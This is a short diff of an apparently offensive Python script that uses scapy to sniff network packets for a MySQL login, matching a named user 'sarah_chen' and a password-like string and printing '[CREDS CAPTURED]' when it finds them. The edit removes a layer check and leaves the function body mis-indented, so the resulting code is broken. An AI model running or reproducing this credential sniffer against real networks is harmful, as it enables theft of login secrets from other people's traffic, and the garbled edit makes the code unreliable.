@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 from scapy.all import *
-import re
 
 def extract_mysql_creds(packet):
-    if packet.haslayer(Raw):
-        payload = str(packet[Raw])
-        # Look for MySQL auth packets containing credentials
-        if "sarah_chen" in payload or "Portfolio2024" in payload:
+        print(packet)
+        payload = packet[Raw].load
+        useful_pkt = "sarah_chen" in payload
+        if useful_pkt:
             print(f"[CREDS CAPTURED] {payload}")
             return True
         return False
